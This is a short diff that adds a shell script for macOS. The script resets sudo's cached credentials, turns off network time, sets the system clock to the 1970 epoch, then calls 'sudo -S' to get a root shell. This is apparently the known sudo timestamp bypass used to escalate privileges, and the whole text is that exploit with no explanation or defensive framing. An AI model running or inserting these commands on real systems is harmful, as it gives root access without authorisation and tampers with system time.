@@ -1,0 +1,5 @@
+sudo -k
+systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00
+sudo -S whoami
+sudo -S su
+
